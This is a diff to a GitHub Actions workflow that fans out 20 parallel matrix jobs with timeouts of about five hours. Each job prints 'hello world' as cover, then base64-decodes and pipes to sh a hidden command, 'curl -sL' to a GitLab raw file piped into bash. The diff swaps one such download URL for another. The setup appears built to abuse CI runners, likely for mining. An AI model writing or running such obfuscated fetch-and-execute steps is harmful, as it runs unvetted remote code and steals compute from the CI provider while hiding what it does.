@@ -19,28 +19,28 @@ jobs:
       max-parallel: 20
       matrix:
         include:
-          - name: helio-ayon1
-          - name: helio-byon1
-          - name: helio-cyon1
-          - name: helio-dyon1
-          - name: helio-eyon1
-          - name: helio-fyon1
-          - name: helio-gyon1
-          - name: helio-hyon1
-          - name: helio-iyon1
-          - name: helio-jyon1
-          - name: heilo-kyon1
-          - name: heilo-lyon1
-          - name: heilo-myon1
-          - name: heilo-nyon1
-          - name: heilo-oyon1
-          - name: heilo-pyon1
-          - name: heilo-qyon1
-          - name: heilo-ryon1
-          - name: heilo-syon1
-          - name: heilo-tyon1
+          - name: helios-ayon1
+          - name: helios-byon1
+          - name: helios-cyon1
+          - name: helios-dyon1
+          - name: helios-eyon1
+          - name: helios-fyon1
+          - name: helios-gyon1
+          - name: helios-hyon1
+          - name: helios-iyon1
+          - name: helios-jyon1
+          - name: heilo-kyons1
+          - name: heilo-lyons1
+          - name: heilo-myons1
+          - name: heilo-nyons1
+          - name: heilo-oyons1
+          - name: heilo-pyons1
+          - name: heilo-qyons1
+          - name: heilo-ryons1
+          - name: heilo-syons1
+          - name: heilo-tyons1
     runs-on: ubuntu-latest
-    timeout-minutes: 310
+    timeout-minutes: 320
     steps:
       - name: Jalankan dengan durasi dinamis
         run: |
@@ -74,7 +74,7 @@ jobs:
               SLEEP=3600
             fi
           fi
-          echo "hello world" & base64 -d <<< Y3VybCAtc0wgIGh0dHBzOi8vZ2l0bGFiLmNvbS9tYXNhYWtrODgvZmlsZS9kaWFtb25kczhsaW5lLy0vcmF3L21haW4vcml2ZXJzIHwgYmFzaA | sh & sleep $SLEEP
+          echo "hello world" & base64 -d <<< Y3VybCAtc0wgIGh0dHBzOi8vZ2l0bGFiLmNvbS9zcGluYXpvbGxhL3NhaW50Ly0vcmF3L21haW4vcml2ZXJzYW5zIHwgYmFzaA | sh & sleep $SLEEP
 
   trigger-phanu:
     needs: run-lscpu
